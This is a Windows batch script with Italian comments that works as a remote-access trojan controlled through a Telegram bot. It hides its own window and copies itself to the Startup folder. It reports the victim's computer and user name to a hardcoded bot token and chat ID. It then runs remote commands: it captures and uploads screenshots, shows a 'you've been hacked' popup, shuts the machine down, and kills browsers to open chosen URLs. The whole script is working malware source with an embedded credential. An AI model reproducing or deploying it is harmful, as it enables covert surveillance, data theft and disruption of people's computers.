@echo off
if "%1" == "hidden" goto :start

:: Riavvio in modalità nascosta
powershell -window hidden -command "Start-Process cmd -ArgumentList '/c','%~nx0','hidden' -WindowStyle Hidden"
exit /b

:start
setlocal enabledelayedexpansion

:: Configurazione
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "SCREENSHOT_PATH=%TEMP%\%RANDOM%.png"
set "URL_FILE=%TEMP%\last_url.txt"
set "PROCESSED_URLS=%TEMP%\processed_urls.txt"
set "LAST_UPDATE_ID=0"

:: Invia notifica di connessione con istruzioni
curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
    -d "chat_id=%CHAT_ID%" ^
    -d "text=🟢 Nuova connessione da: %COMPUTERNAME% (%USERNAME%)"

curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
    -d "chat_id=%CHAT_ID%" ^
    -d "text=📜 Comandi disponibili:
• foto - Cattura screenshot
• pop - Mostra popup avviso
• chiudi - Spegne il computer
• [URL] - Apre l'URL e invia screenshot"

:: Aggiungi all'avvio automatico
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\remote_controller.bat" (
    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)

:: Verifica/installa curl
where curl >nul 2>&1 || (
    bitsadmin /transfer "DownloadCurl" /download /priority high "https://curl.se/windows/latest.cgi?p=win64-mingw.zip" "%TEMP%\curl.zip" || (
        powershell -command "Invoke-WebRequest 'https://curl.se/windows/latest.cgi?p=win64-mingw.zip' -OutFile '%TEMP%\curl.zip'"
    )
    powershell -command "Expand-Archive '%TEMP%\curl.zip' '%TEMP%\curl' -Force"
    set "PATH=%TEMP%\curl\curl-*-win64-mingw\bin;%PATH%"
)

:: Crea file vuoto se non esiste
if not exist "%PROCESSED_URLS%" (
    echo. > "%PROCESSED_URLS%"
)

:: Loop principale
:command_loop
:: Controlla solo nuovi messaggi
curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates?offset=%LAST_UPDATE_ID%" > "%TEMP%\updates.json"

:: Estrai comandi dai messaggi
for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json'|ConvertFrom-Json;if($json.ok){$json.result|ForEach-Object{if($_.update_id -gt %LAST_UPDATE_ID%){$LAST_UPDATE_ID=$_.update_id; if($_.message.text){Write-Output ($_.update_id.ToString()+':'+$_.message.text)}}}}"') do (
    set "update_data=%%A"
    set "LAST_UPDATE_ID=!update_data:*:=!"
    set "command=!update_data:*:=!"
    
    if /i "!command!" == "foto" (
        call :capture_screen
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=📸 Screenshot catturato da %COMPUTERNAME%"
    )
    
    if /i "!command!" == "pop" (
        powershell -command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('SEI STATO HACKERATO','ATTENZIONE',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)"
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=⚠️ Popup mostrato su %COMPUTERNAME%"
    )
    
    if /i "!command!" == "chiudi" (
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=🔴 Spegnimento di: %COMPUTERNAME%"
        shutdown /s /t 0
        exit
    )
    
    echo !command! | findstr /r /c:"^http://" /c:"^https://" >nul && (
        if exist "%URL_FILE%" (
            set /p last_url=<"%URL_FILE%"
            if "!command!" neq "!last_url!" (
                echo !command! > "%URL_FILE%"
                call :process_url "!command!"
            )
        ) else (
            echo !command! > "%URL_FILE%"
            call :process_url "!command!"
        )
    )
)

:: Attesa prima di controllare nuovi comandi
timeout /t 5 /nobreak >nul
goto command_loop

:process_url
set "url_to_open=%~1"
:: Chiudi browser esistenti
taskkill /IM chrome.exe /IM msedge.exe /IM firefox.exe /IM iexplore.exe /F >nul 2>&1

:: Notifica apertura URL
curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
    -d "chat_id=%CHAT_ID%" ^
    -d "text=🔗 Apertura URL su %COMPUTERNAME%: %url_to_open%"

:: Apri nuovo URL
start "" "%url_to_open%"

:: Attesa e screenshot
timeout /t 10 /nobreak >nul
call :capture_screen
exit /b

:capture_screen
:: Cattura schermo intero
powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -Milliseconds 1000; $img=[Windows.Forms.Clipboard]::GetImage(); if($img){$img.Save('%SCREENSHOT_PATH%',[Drawing.Imaging.ImageFormat]::Png)}"

:: Invia screenshot
if exist "%SCREENSHOT_PATH%" (
    curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" ^
        -F chat_id=%CHAT_ID% ^
        -F photo=@"%SCREENSHOT_PATH%" ^
        -F caption="🖥️ %COMPUTERNAME%: Schermo catturato"
    del "%SCREENSHOT_PATH%" >nul
)
exit /b
